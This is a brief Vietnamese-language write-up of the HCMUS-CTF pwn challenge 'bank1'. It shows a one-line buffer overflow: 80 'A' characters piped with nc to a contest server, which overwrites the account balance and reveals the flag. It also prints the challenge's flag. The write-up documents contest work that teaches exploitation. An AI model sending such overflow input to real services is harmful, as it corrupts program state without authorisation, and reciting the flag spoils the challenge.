## ⚡ [bank1](https://ctf.hcmus.edu.vn/challenges#bank1-7)

[![df](https://img.shields.io/badge/B3T4-shark-brightgreen.svg)](https://img.shields.io/badge/B3T4-shark-brightgreen.svg)
[![df](https://img.shields.io/badge/member-viplazy-brightgreen.svg)](https://img.shields.io/badge/member-viplazy-brightgreen.svg)
[![df](https://img.shields.io/badge/25-pts-brightgreen.svg)](https://img.shields.io/badge/25-pts-brightgreen.svg)

Tác giả: `xikhud`

Tags: `pwn` `bof`

### Summary

Chạy thử chương trình thì thấy nó cho nhập một chuỗi kí tự, rồi sau đó kết thúc.

### Exploit

Vì không có binary, ta chỉ thử buffer overflow nó xem sao:

```bash
$ python2 -c 'print "A"*80' | nc 61.28.237.24 30202
[+] Please enter your name: [+] Thanks for the registration, your balance is 1094795585.
HCMUS-CTF{that_was_easy_xd}
```

Vậy là ta lấy được flag luôn @@.

📫 Flag: **`HCMUS-CTF{that_was_easy_xd}`**

---
*[Back to table of contents](../README.md)*
